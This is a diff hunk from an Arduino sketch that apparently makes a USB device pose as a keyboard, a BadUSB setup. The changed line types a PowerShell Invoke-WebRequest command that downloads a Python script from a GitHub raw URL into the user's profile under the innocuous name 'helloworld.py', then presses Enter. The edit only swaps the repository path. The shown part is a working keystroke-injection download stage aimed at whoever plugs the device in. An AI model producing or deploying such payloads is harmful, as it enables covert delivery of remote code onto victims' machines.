@@ -22,7 +22,7 @@ void setup() {
   delay(1000);
   
   // download python file
-  Keyboard.print("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/stanislavzxc/invokeTest/main/invoke.py' -OutFile \"$env:USERPROFILE\\helloworld.py\"");
+  Keyboard.print("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/stanislavzxc/BabUsb-Arduino-with-python/main/invoke.py' -OutFile \"$env:USERPROFILE\\helloworld.py\"");
   delay(200);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
